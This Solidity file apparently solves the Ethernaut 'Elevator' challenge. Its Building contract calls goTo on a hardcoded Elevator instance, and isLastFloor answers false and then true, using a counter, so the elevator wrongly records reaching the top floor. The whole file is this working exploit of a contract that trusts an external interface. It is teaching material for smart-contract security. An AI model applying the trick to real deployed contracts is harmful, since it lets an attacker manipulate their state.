// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    uint32 private entrenceCnt = 0;

    function goTop() external {
        address levelContractAddress = 0xc1c92fcd70d632BC49Bb9656aC2421E8F21F3D5D;
        Elevator e = Elevator(levelContractAddress);
        e.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        bool result = entrenceCnt % 2 == 1;
        entrenceCnt++;
        return result;
    }
}